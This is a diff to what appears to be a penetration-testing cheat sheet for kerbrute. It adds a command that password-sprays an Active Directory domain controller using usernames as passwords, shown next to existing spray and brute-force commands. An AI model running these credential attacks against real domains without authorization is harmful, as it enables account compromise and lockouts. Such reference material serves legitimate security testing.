@@ -12,6 +12,10 @@
 
     ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 WORDLIST.TXT PASSWORD
 
+Try username as password
+
+    kerbrute passwordspray -d domain.local --dc DC_IP --user-as-pass usernames.txt
+
 #### Bruteforce attack
 
     ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 WORDLIST.TXT USER
